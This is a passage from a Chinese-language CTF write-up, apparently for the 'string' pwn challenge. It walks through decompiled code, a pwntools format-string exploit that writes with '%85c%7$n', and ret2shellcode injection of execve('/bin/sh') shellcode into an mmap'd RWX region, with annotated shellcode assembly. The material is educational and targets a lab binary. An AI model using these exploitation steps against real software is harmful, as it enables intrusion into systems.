class="built_in">strcmp</span>(s1, <span class="string">&quot;up&quot;</span>) )</span><br><span class="line">      sub_4009DD();					<span class="comment">//屑函数,死路</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;YOU KNOW WHAT YOU DO?&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="sub_400bb9">sub_400BB9</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_400BB9</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-7Ch] BYREF</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+8h] [rbp-78h] BYREF</span></span><br><span class="line">  <span class="type">char</span> format[<span class="number">104</span>]; <span class="comment">// [rsp+10h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);<span class="comment">//从fs段偏移0x28=40字节读取一个四字</span></span><br><span class="line">  v2 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You travel a short distance east.That&#x27;s odd, anyone disappear suddenly&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;, what happend?! You just travel , and find another hole&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You recall, a big black hole will suckk you into it! Know what should you do?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;go into there(1), or leave(0)?:&quot;</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;A voice heard in your mind&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&#x27;Give me an address&#x27;&quot;</span>);				</span><br><span class="line">    _isoc99_scanf(<span class="string">&quot;%ld&quot;</span>, &amp;v2);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;And, you wish is:&quot;</span>);</span><br><span class="line">    _isoc99_scanf(<span class="string">&quot;%s&quot;</span>, format);		</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Your wish is&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(format);				<span class="comment">//此处存在格式化字符串漏洞</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;I hear it, I hear it....&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>存在格式化字符串漏洞,有可能要利用,联系后文可知,此处要使用printf格式化字符串漏洞,将主函数中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*v4 = 68;</span><br><span class="line">v4[1] = 85;</span><br></pre></td></tr></table></figure>
<p>它俩给溢出修改成相同的值</p>
<p>前面主函数中还有</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;secret[0] is %x\n&quot;</span>, v4);					<span class="comment">//&amp;v4的16进制表示</span></span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;secret[1] is %x\n&quot;</span>, v4 + <span class="number">1</span>);</span><br></pre></td></tr></table></figure>
<p>将v4和v4[1]的地址直接白给了</p>
<p>考虑如何构造这个格式化字符串漏洞攻击</p>
<p>注意到</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;&#x27;Give me an address&#x27;&quot;</span>);				</span><br><span class="line">_isoc99_scanf(<span class="string">&quot;%ld&quot;</span>, &amp;v2);</span><br></pre></td></tr></table></figure>
<p>这里输入了一个长整数v2,也是放在栈上的,我们可以把v4的地址输入v2,然后溢出改变之</p>
<blockquote>
<p>也可以不使用这里的v2,直接在格式化字符串中完成</p>
</blockquote>
<p>首先要找出<code>printf(s)</code>打印时,v2在栈中,是第几个格式化字符串参数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh=process(<span class="string">&#x27;./string&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&quot;What should your character&#x27;s name be:&quot;</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">&#x27;Vader&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;So, where you will go?east or up?:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">&#x27;east&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;go into there(1), or leave(0)?:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&quot;&#x27;Give me an address&#x27;&quot;</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">&#x27;9999&#x27;</span>)<span class="comment">#这里使用9999,其16进制值为0x270f,待会儿方便寻找</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sh.interactive()</span></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;And, you wish is:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">&#x27;AAAAAAAA-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p&#x27;</span>)//AAAAAAAA八个字符正好在栈上占一个对齐单元</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>运行结果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Your wish is</span><br><span class="line">AAAAAAAA-0x7f6645ea9743-(nil)-0x7f6645dc8603-0xd-0xffffffffffffff88-0x100000000-0x270f-0x4141414141414141-0x252d70252d70252d-0x2d70252d70252d70-0x70252d70252d7025-0x252d70252d70252d-0x70252d70252d70I hear it, I hear it.... </span><br></pre></td></tr></table></figure>
<table>
<colgroup>
<col style="width: 9%" />
<col style="width: 8%" />
<col style="width: 8%" />
<col style="width: 3%" />
<col style="width: 8%" />
<col style="width: 2%" />
<col style="width: 11%" />
<col style="width: 7%" />
<col style="width: 10%" />
<col style="width: 28%" />
</colgroup>
<thead>
<tr>
<th>第n个格式化参数</th>
<th>不是格式化参数</th>
<th>1</th>
<th>2</th>
<th>3</th>
<th>4</th>
<th>5</th>
<th>6</th>
<th>7</th>
<th>8</th>
</tr>
</thead>
<tbody>
<tr>
<td>打印内容</td>
<td>AAAAAAAA</td>
<td>0x7f6645ea9743</td>
<td>(nil)</td>
<td>0x7f6645dc8603</td>
<td>0xd</td>
<td>0xffffffffffffff88</td>
<td>0x100000000</td>
<td>0x270f</td>
<td>0x4141414141414141</td>
</tr>
<tr>
<td>意义</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>9999,刚才输入的v2</td>
<td>格式化字符串本身作为一个普通字符串的起始位置</td>
</tr>
</tbody>
</table>
<p>可以判断,输入的v2将会被作为第7个格式化字符串参数</p>
<p>然后我们在前面的交互过程中获取到v4的地址,在<code>give me an address</code>之后输入,作为第七个格式化字符串参数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh=process(<span class="string">&#x27;./string&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;secret[0] is &#x27;</span>)</span><br><span class="line"></span><br><span class="line">v4_addr = sh.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">v4_addr = <span class="built_in">int</span>(v4_addr, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(v4_addr))</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&quot;What should your character&#x27;s name be:&quot;</span>.encode())</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">&#x27;Vader&#x27;</span>.encode())</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;So, where you will go?east or up?:&#x27;</span>.encode())</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">&#x27;east&#x27;</span>.encode())</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;go into there(1), or leave(0)?:&#x27;</span>.encode())</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">&#x27;1&#x27;</span>.encode())</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&quot;&#x27;Give me an address&#x27;&quot;</span>.encode())</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="built_in">str</span>(v4_addr))</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;And, you wish is:&#x27;</span>.encode())</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">&#x27;AAAAAAAA-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p&#x27;</span>.encode())</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x1ccb2a0</span></span><br><span class="line">....</span><br><span class="line">Your wish <span class="keyword">is</span></span><br><span class="line">AAAAAAAA-<span class="number">0x7f5c06c84743</span>-(nil)-<span class="number">0x7f5c06ba3603</span>-<span class="number">0xd</span>-<span class="number">0xffffffffffffff88</span>-<span class="number">0x100000000</span>-<span class="number">0x1ccb2a0</span>-<span class="number">0x4141414141414141</span>-<span class="number">0x252d70252d70252d</span>-<span class="number">0x2d70252d70252d70</span>-<span class="number">0x70252d70252d7025</span>-<span class="number">0x252d70252d70252d</span>-0x70252d70252d70I hear it, I hear it....   </span><br></pre></td></tr></table></figure>
<p>现在v4的地址放好了,下面开始构造溢出</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*v4 = 68;</span><br><span class="line">v4[1] = 85;</span><br></pre></td></tr></table></figure>
<p>因此我们应当将<code>*v4</code>修改为85,</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;%85c%7$n&#x27;</span></span><br></pre></td></tr></table></figure>
<p>此时执行<code>exp.py</code>得到</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Wizard: I will <span class="built_in">help</span> you! USE YOU SPELL </span><br></pre></td></tr></table></figure>
<p>我们成功召唤了巫师</p>
<h3 id="sub_400ca6_dword-a1">sub_400CA6((_DWORD *)a1)</h3>
<p>a1是<code>sub_400D72</code>的参数,a1的历史沿革:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">_DWORD *v4; <span class="comment">// [rsp+18h] [rbp-78h]//双字指针类型,int*</span></span><br><span class="line">v4 = <span class="built_in">malloc</span>(<span class="number">8uLL</span>);</span><br><span class="line">*v4 = <span class="number">68</span>;			<span class="comment">//v4[0]=68</span></span><br><span class="line">v4[<span class="number">1</span>] = <span class="number">85</span>;		<span class="comment">//v4[1]=85</span></span><br><span class="line"></span><br><span class="line">main-&gt;sub_400D72((__int64)v4)-&gt;sub_400CA6((_DWORD *)a1)</span><br><span class="line">main中v4在堆上开了<span class="number">8</span>字节空间分成两个双字,v4[<span class="number">0</span>]=<span class="number">68</span>,v4[<span class="number">1</span>]=<span class="number">85</span>,然后转化为一个四字qword作为参数进行值传送,然后在sub_400CA6中以双字指针形式进行引用传递</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_400CA6</span><span class="params">(_DWORD *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *v1; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Ahu!!!!!!!!!!!!!!!!A Dragon has appeared!!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Dragon say: HaHa! you were supposed to have a normal&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;RPG game, but I have changed it! you have no weapon and &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;skill! you could not defeat me !&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;That&#x27;s sound terrible! you meet final boss!but you level is ONE!&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *a1 == a1[<span class="number">1</span>] )				<span class="comment">//当a1[0]==a1[1]时就有巫师出手相助,否则嗝屁</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wizard: I will help you! USE YOU SPELL&quot;</span>);</span><br><span class="line">    v1 = mmap(<span class="number">0LL</span>, <span class="number">0x1000</span>uLL, <span class="number">7</span>, <span class="number">33</span>, <span class="number">-1</span>, <span class="number">0LL</span>);<span class="comment">//没有和文件描述符关联,则不把任何文件映射到进程的虚拟地址空间</span></span><br><span class="line">    read(<span class="number">0</span>, v1, <span class="number">0x100</span>uLL);					<span class="comment">//从标准输入0即键盘读取至多0x100个字符,到v1缓冲区</span></span><br><span class="line">    ((<span class="type">void</span> (__fastcall *)(_QWORD))v1)(<span class="number">0LL</span>);		<span class="comment">//一个函数指针,但是v1明明是一个虚拟地址空间的指针,强行作为函数指针</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<h4 id="mmap"><code>mmap</code></h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">mmap</span><span class="params">(<span class="type">void</span> *start , <span class="type">size_t</span> length, <span class="type">int</span> prot, <span class="type">int</span> flags, <span class="type">int</span> fd, <span class="type">off_t</span> offset)</span>;</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220518084118644.png"
alt="image-20220518084118644" />
<figcaption aria-hidden="true">image-20220518084118644</figcaption>
</figure>
<blockquote>
<p>mmap是一种内存映射文件的方法，即将一个文件或者其它对象映射到进程的地址空间，实现文件磁盘地址和进程虚拟地址空间中一段虚拟地址的一一对映关系。实现这样的映射关系后，进程就可以采用指针的方式读写操作这一段内存，而系统会自动回写脏页面到对应的文件磁盘上，即完成了对文件的操作而不必再调用read,write等系统调用函数。</p>
<p><a
target="_blank" rel="noopener" href="https://www.cnblogs.com/huxiao-tee/p/4660352.html">认真分析mmap：是什么
为什么 怎么用 - 胡潇 - 博客园 (cnblogs.com)</a></p>
</blockquote>
<p>在本题中mmap要求内核创建一个<code>0x1000</code>大小的空间,</p>
<p><code>prot=7=001|010|100</code>即该空间具有可读写执行的权限,有可能要写入shellcode并在此处执行</p>
<blockquote>
<p>由于程序本身开启了NX保护即堆栈不可执行,</p>
<p>因此这里程序没有直接在栈上开缓冲区,而是故意使用了mmap新开了空间,并且赋予该空间<del>唱,跳,rap,篮球</del>读,写,执行的权限,</p>
<p>已经在疯狂暗示ret2shellcode了</p>
</blockquote>
</blockquote>
<p>只需要写入<code>shellcode</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)<span class="comment">#此句必须,不写的话无法获取shell</span></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Wizard: I will help you! USE YOU SPELL&#x27;</span>.encode())</span><br><span class="line"></span><br><span class="line">shellcode =asm(shellcraft.sh()) </span><br><span class="line"></span><br><span class="line">sh.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>然后一个函数指针就会来执行shellcode</p>
<p>执行之后</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[*] Switching to interactive mode</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">bin</span><br><span class="line">dev</span><br><span class="line">flag</span><br><span class="line">lib</span><br><span class="line">lib32</span><br><span class="line">lib64</span><br><span class="line">string</span><br><span class="line">$ <span class="built_in">cat</span> flag</span><br><span class="line">cyberpeace&#123;421c7c91f8fbfb8755cced825fc617ab&#125;</span><br></pre></td></tr></table></figure>
<h3
id="contextoslinux-archamd64"><code>context(os='linux', arch='amd64')</code></h3>
<p>设置pwntools环境,不同的操作系统架构会有不同的汇编指令</p>
<p>由于前面我们check时已经了解到string是一个amd64架构,linux操作系统的程序,因此需要设置一下"上下文"<code>context</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">shellcode = shellcraft.sh()//默认环境的shellcode</span><br><span class="line"><span class="built_in">print</span>(shellcode)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;..........................&#x27;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">shellcode = shellcraft.sh()</span><br><span class="line"><span class="built_in">print</span>(shellcode)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/Desktop/pwn/string]    </span><br><span class="line">└─# python3 shell.py</span><br><span class="line">    /* execve(path=&#x27;/bin///sh&#x27;, argv=[&#x27;sh&#x27;], envp=0) */        </span><br><span class="line">    /* push b&#x27;/bin///sh\x00&#x27; */</span><br><span class="line">    push 0x68</span><br><span class="line">    push 0x732f2f2f</span><br><span class="line">    push 0x6e69622f</span><br><span class="line">    mov ebx, esp</span><br><span class="line">    /* push argument array [&#x27;sh\x00&#x27;] */</span><br><span class="line">    /* push &#x27;sh\x00\x00&#x27; */</span><br><span class="line">    push 0x1010101</span><br><span class="line">    xor dword ptr [esp], 0x1016972</span><br><span class="line">    xor ecx, ecx</span><br><span class="line">    push ecx /* null terminate */</span><br><span class="line">    push 4</span><br><span class="line">    pop ecx</span><br><span class="line">    add ecx, esp</span><br><span class="line">    push ecx /* &#x27;sh\x00&#x27; */</span><br><span class="line">    mov ecx, esp</span><br><span class="line">    xor edx, edx</span><br><span class="line">    /* call execve() */</span><br><span class="line">    push SYS_execve /* 0xb */</span><br><span class="line">    pop eax</span><br><span class="line">    int 0x80</span><br><span class="line"></span><br><span class="line">..........................</span><br><span class="line">    /* execve(path=&#x27;/bin///sh&#x27;, argv=[&#x27;sh&#x27;], envp=0) */        </span><br><span class="line">    /* push b&#x27;/bin///sh\x00&#x27; */</span><br><span class="line">    push 0x68</span><br><span class="line">    mov rax, 0x732f2f2f6e69622f</span><br><span class="line">    push rax</span><br><span class="line">    mov rdi, rsp</span><br><span class="line">    /* push argument array [&#x27;sh\x00&#x27;] */</span><br><span class="line">    /* push b&#x27;sh\x00&#x27; */</span><br><span class="line">    push 0x1010101 ^ 0x6873</span><br><span class="line">    xor dword ptr [rsp], 0x1010101</span><br><span class="line">    xor esi, esi /* 0 */</span><br><span class="line">    push rsi /* null terminate */</span><br><span class="line">    push 8</span><br><span class="line">    pop rsi</span><br><span class="line">    add rsi, rsp</span><br><span class="line">    push rsi /* &#x27;sh\x00&#x27; */</span><br><span class="line">    mov rsi, rsp</span><br><span class="line">    xor edx, edx /* 0 */</span><br><span class="line">    /* call execve() */</span><br><span class="line">    push SYS_execve /* 0x3b */</span><br><span class="line">    pop rax</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure>
<p>两个<code>shellcode</code>是不一样的</p>
<h3 id="shellcode">shellcode</h3>
<p>关于<code>linux amd64</code>上的<code>shellcode</code>:</p>
<p>它干了啥呢?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">/* execve(path=&#x27;/bin///sh&#x27;, argv=[&#x27;sh&#x27;], envp=0) */        </span><br><span class="line">/* push b&#x27;/bin///sh\x00&#x27; */</span><br><span class="line">push 0x68</span><br><span class="line">mov rax, 0x732f2f2f6e69622f</span><br><span class="line">push rax</span><br><span class="line">mov rdi, rsp</span><br><span class="line">/* push argument array [&#x27;sh\x00&#x27;] */</span><br><span class="line">/* push b&#x27;sh\x00&#x27; */</span><br><span class="line">push 0x1010101 ^ 0x6873</span><br><span class="line">xor dword ptr [rsp], 0x1010101</span><br><span class="line">xor esi, esi /* 0 */</span><br><span class="line">push rsi /* null terminate */</span><br><span class="line">push 8</span><br><span class="line">pop rsi</span><br><span class="line">add rsi, rsp</span><br><span class="line">push rsi /* &#x27;sh\x00&#x27; */</span><br><span class="line">mov rsi, rsp</span><br><span class="line">xor edx, edx /* 0 */</span><br><span class="line">/* call execve() */</span><br><span class="line">push SYS_execve /* 0x3b */</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
<p>一开始</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push 0x68</span><br><span class="line">mov rax, 0x732f2f2f6e69622f</span><br><span class="line">push rax</span><br></pre></td></tr></table></figure>
<p>压栈的16进制数转化为ASCII码为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hs///nib/</span><br></pre></td></tr></table></figure>
<p>这是小端存储的,翻译成人话是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin///sh</span><br></pre></td></tr></table></figure>
<p>然后</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov rdi, rsp</span><br></pre></td></tr></table></figure>
<p>把栈顶指针交给rdi保存,最后还要还回来</p>
<p>然后两条蜜汁语句</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push 0x1010101 ^ 0x6873</span><br><span class="line">xor dword ptr [rsp], 0x1010101</span><br></pre></td></tr></table></figure>
<p>把0x1010101先和0x6873异或一下,然后再和0x1010101异或,这部相当于直接来0x6873吗?</p>
<p>翻译成ASCII码是<code>hs</code>,这是小端存储的,翻译成人话就是<code>sh</code></p>
<p>然后</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xor esi, esi /* 0 */</span><br><span class="line">push rsi /* null terminate */</span><br></pre></td></tr></table></figure>
<p>将0压栈</p>
<p>然后又是蜜汁操作</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push 8</span><br><span class="line">pop rsi</span><br><span class="line">add rsi, rsp</span><br></pre></td></tr></table></figure>
